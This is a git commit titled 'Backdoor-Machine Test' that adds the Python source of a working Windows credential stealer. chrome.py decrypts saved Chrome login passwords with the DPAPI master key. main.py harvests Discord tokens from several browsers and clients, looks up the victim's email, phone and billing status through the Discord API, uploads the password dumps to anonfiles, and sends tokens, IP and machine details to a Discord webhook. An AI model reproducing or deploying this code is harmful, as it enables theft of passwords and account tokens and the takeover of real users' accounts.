48a0fba3300f67e047b04f027f0e500eb8e65d3e
CUPZYY <richbanana1234@gmail.com>
2021-04-26 21:16:26 +0200

    Backdoor-Machine Test

---
+++ chrome.py
@@ -0,0 +1,83 @@
+import os
+import json
+import base64
+import sqlite3
+import win32crypt
+from Crypto.Cipher import AES
+import shutil
+
+TEMP = os.getenv("TEMP")
+ROAMING = os.getenv("APPDATA")
+LOCAL = os.getenv("LOCALAPPDATA")
+
+
+def bothInstalled():
+    chrome = False
+    brave = False
+    if os.path.exists(LOCAL + r'\BraveSoftware\Brave-Browser\User Data\default\Login Data'):
+        brave = True
+    if os.path.exists(LOCAL + r'\Google\Chrome\User Data\Local State'):
+        chrome = True
+    if chrome is True & brave is True:
+        return True
+
+
+def get_master_key():
+    with open(os.environ['USERPROFILE'] + os.sep + r'AppData\Local\Google\Chrome\User Data\Local State',
+              "r", encoding='utf-8') as f:
+        local_state = f.read()
+        local_state = json.loads(local_state)
+    master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
+    master_key = master_key[5:]
+    master_key = win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1]
+    return master_key
+
+
+def decrypt_payload(cipher, payload):
+    return cipher.decrypt(payload)
+
+
+def generate_cipher(aes_key, iv):
+    return AES.new(aes_key, AES.MODE_GCM, iv)
+
+
+def decrypt_password(buff, master_key):
+    try:
+        iv = buff[3:15]
+        payload = buff[15:]
+        cipher = generate_cipher(master_key, iv)
+        decrypted_pass = decrypt_payload(cipher, payload)
+        decrypted_pass = decrypted_pass[:-16].decode()
+        return decrypted_pass
+    except Exception:
+        return "Chrome < 80"
+
+
+def get_password():
+    master_key = get_master_key()
+    login_db = os.environ[
+                   'USERPROFILE'] + os.sep + r'AppData\Local\Google\Chrome\User Data\default\Login Data'
+    shutil.copy2(login_db,
+                 TEMP + r"\Loginvault.db")
+    conn = sqlite3.connect(TEMP + r"\Loginvault.db")
+    cursor = conn.cursor()
+
+    try:
+        cursor.execute("SELECT action_url, username_value, password_value FROM logins")
+        if not bothInstalled():
+            w = open(TEMP + r"\login.txt", "w+")
+        else:
+            w = open(TEMP + r"\chromelogin.txt", "w+")
+        for r in cursor.fetchall():
+            url = r[0]
+            username = r[1]
+            encrypted_password = r[2]
+            decrypted_password = decrypt_password(encrypted_password, master_key)
+            if username != "" or decrypted_password != "":
+                w.write("Site: " + url + "\nUsername: " + username + "\nPassword: " + decrypted_password + "\n**********\n\n")
+    except Exception:
+        pass
+
+    cursor.close()
+    conn.close()
+    os.remove(TEMP + r"\Loginvault.db")
---
+++ main.py
@@ -0,0 +1,367 @@
+import os
+
+import brave
+import chrome
+
+if os.name != "nt":
+    exit()
+from re import findall
+from json import loads, dumps
+from base64 import b64decode
+from urllib.request import Request, urlopen
+import requests
+import os
+import json
+
+
+LOCAL = os.getenv("LOCALAPPDATA")
+TEMP = os.getenv("TEMP")
+ROAMING = os.getenv("APPDATA")
+mcpath = ROAMING + "\\.minecraft"
+
+PATHS = {
+
+    "Discord": ROAMING + "\\Discord",
+
+    "Discord Canary": ROAMING + "\\discordcanary",
+
+    "Discord PTB": ROAMING + "\\discordptb",
+
+    "Google Chrome": LOCAL + "\\Google\\Chrome\\User Data\\Default",
+
+    "Opera": ROAMING + "\\Opera Software\\Opera Stable",
+
+    "Brave": LOCAL + "\\BraveSoftware\\Brave-Browser\\User Data\\Default",
+
+    "Yandex": LOCAL + "\\Yandex\\YandexBrowser\\User Data\\Default"
+
+}
+
+
+def getheaders(token=None, content_type="application/json"):
+    headers = {
+
+        "Content-Type": content_type,
+
+        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11"
+
+    }
+
+    if token:
+        headers.update({"Authorization": token})
+
+    return headers
+
+
+def installedBrowser():
+    chrome = False
+    brave = False
+    if os.path.exists(LOCAL + r'\BraveSoftware\Brave-Browser\User Data\default\Login Data'):
+        brave = True
+    if os.path.exists(LOCAL + r'\Google\Chrome\User Data\Local State'):
+        chrome = True
+    if chrome is True & brave is True:
+        return "Both"
+    elif chrome is True:
+        return "Chrome"
+    elif brave is True:
+        return "Brave"
+
+
+def getuserdata(token):
+    try:
+
+        return loads(
+            urlopen(Request("https://discordapp.com/api/v6/users/@me", headers=getheaders(token))).read().decode())
+
+    except:
+
+        pass
+
+
+def deleteLoginfile():
+    try:
+        os.remove(TEMP + r"\login.txt")
+    except Exception:
+        pass
+
+
+def gettokens(path):
+    path += "\\Local Storage\\leveldb"
+
+    tokens = []
+
+    for file_name in os.listdir(path):
+
+        if not file_name.endswith(".log") and not file_name.endswith(".ldb"):
+            continue
+
+        for line in [x.strip() for x in open(f"{path}\\{file_name}", errors="ignore").readlines() if x.strip()]:
+
+            for regex in (r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}", r"mfa\.[\w-]{84}"):
+
+                for token in findall(regex, line):
+                    tokens.append(token)
+
+    return tokens
+
+
+def getip():
+    ip = "None"
+
+    try:
+
+        ip = urlopen(Request("http://ip.42.pl/raw")).read().decode().strip()
+
+    except:
+
+        pass
+
+    return ip
+
+
+def getavatar(uid, aid):
+    url = f"https://cdn.discordapp.com/avatars/{uid}/{aid}.gif"
+
+    try:
+
+        urlopen(Request(url))
+
+    except:
+
+        url = url[:-4]
+
+    return url
+
+
+def has_payment_methods(token):
+    try:
+
+        return bool(len(loads(urlopen(Request("https://discordapp.com/api/v6/users/@me/billing/payment-sources",
+                                              headers=getheaders(token))).read().decode())) > 0)
+
+    except:
+
+        pass
+
+
+def getlogininfo():
+    browserInstalled = installedBrowser()
+    if browserInstalled == "Chrome":
+        chrome.get_password()
+        url = 'https://api.anonfiles.com/upload'
+        chromelogin_path = TEMP + r"\login.txt"
+        files = {'file': (open(chromelogin_path, 'rb'))}
+        r2 = requests.post(url, files=files)
+        resp2 = json.loads(r2.text)
+        if resp2['status']:
+            loginUrl2 = resp2['data']['file']['url']['short']
+            return loginUrl2
+        else:
+            return "Anonfiles is down"
+    if browserInstalled == "Brave":
+        brave.get_password()
+        url = 'https://api.anonfiles.com/upload'
+        bravelogin_path = TEMP + r"\login.txt"
+        files = {'file': (open(bravelogin_path, 'rb'))}
+        r2 = requests.post(url, files=files)
+        resp2 = json.loads(r2.text)
+        if resp2['status']:
+            loginUrl2 = resp2['data']['file']['url']['short']
+            return loginUrl2
+        else:
+            return "Anonfiles is down"
+    if browserInstalled == "Both":
+        chrome.get_password()
+        brave.get_password()
+        url = 'https://api.anonfiles.com/upload'
+        chromelogin_path = TEMP + r"\chromelogin.txt"
+        bravelogin_path = TEMP + r"\bravelogin.txt"
+        files = {'file': (open(chromelogin_path, 'rb'))}
+        r1 = requests.post(url, files=files)
+        files = {'file': (open(bravelogin_path, 'rb'))}
+        r2 = requests.post(url, files=files)
+        resp1 = json.loads(r1.text)
+        resp2 = json.loads(r2.text)
+        if resp1['status']:
+            loginUrl = resp1['data']['file']['url']['short']
+            loginUrl2 = resp2['data']['file']['url']['short']
+            return loginUrl + "\n" + loginUrl2
+        else:
+            return "Anonfiles is down"
+
+
+def main():
+    cache_path = ROAMING + "\\.cache~$"
+
+    embeds = []
+
+    working = []
+
+    checked = []
+
+    already_cached_tokens = []
+
+    working_ids = []
+
+    ip = getip()
+
+    loginurl = getlogininfo()
+
+    pc_username = os.getenv("UserName")
+
+    pc_name = os.getenv("COMPUTERNAME")
+
+    for platform, path in PATHS.items():
+
+        if not os.path.exists(path):
+            continue
+
+        for token in gettokens(path):
+
+            if token in checked:
+                continue
+
+            checked.append(token)
+
+            uid = None
+
+            if not token.startswith("mfa."):
+
+                try:
+
+                    uid = b64decode(token.split(".")[0].encode()).decode()
+
+                except:
+
+                    pass
+
+                if not uid or uid in working_ids:
+                    continue
+
+            user_data = getuserdata(token)
+
+            if not user_data:
+                continue
+
+            working_ids.append(uid)
+
+            working.append(token)
+
+            username = user_data["username"] + "#" + str(user_data["discriminator"])
+
+            user_id = user_data["id"]
+
+            avatar_id = user_data["avatar"]
+
+            avatar_url = getavatar(user_id, avatar_id)
+
+            email = user_data.get("email")
+
+            phone = user_data.get("phone")
+
+            nitro = bool(user_data.get("premium_type"))
+
+            billing = bool(has_payment_methods(token))
+
+            embed = {
+
+                "color": 0x0eec59,
+
+                "fields": [
+
+                    {
+
+                        "name": "**Discord Info**",
+
+                        "value": f'Email: {email}\nPhone: {phone}\nNitro: {nitro}\nBilling Info: {billing}',
+
+                        "inline": True
+
+                    },
+
+                    {
+
+                        "name": "**Computer Info**",
+
+                        "value": f'IP: {ip}\nUsername: {pc_username}\nPC Name: {pc_name}\nToken Location: {platform}',
+
+                        "inline": True
+
+                    },
+
+                    {
+
+                        "name": "**Discord Token**",
+
+                        "value": token,
+
+                        "inline": False
+
+                    },
+                    {
+
+                        "name": "**Login Info from Brave/Chrome**",
+
+                        "value": loginurl,
+
+                        "inline": False
+
+                    }
+
+                ],
+
+                "author": {
+
+                    "name": f"{username} ({user_id})",
+
+                    "icon_url": avatar_url
+
+                }
+
+            }
+
+            embeds.append(embed)
+
+    with open(cache_path, "a") as file:
+
+        for token in checked:
+
+            if not token in already_cached_tokens:
+                file.write(token + "\n")
+
+    if len(working) == 0:
+        working.append('123')
+
+    webhook = {
+
+        "content": "",
+
+        "embeds": embeds,
+
+        "username": "Backdoor-Machine",
+
+        "avatar_url": "https://cdn.discordapp.com/emojis/766657481966747660.png"
+
+    }
+
+    try:
+
+        urlopen(Request(
+            "YOUR WEBHOOK HERE",
+            data=dumps(webhook).encode(), headers=getheaders()))
+
+    except:
+
+        pass
+
+
+try:
+
+    main()
+
+except Exception as e:
+
+    print(e)
+
+    pass
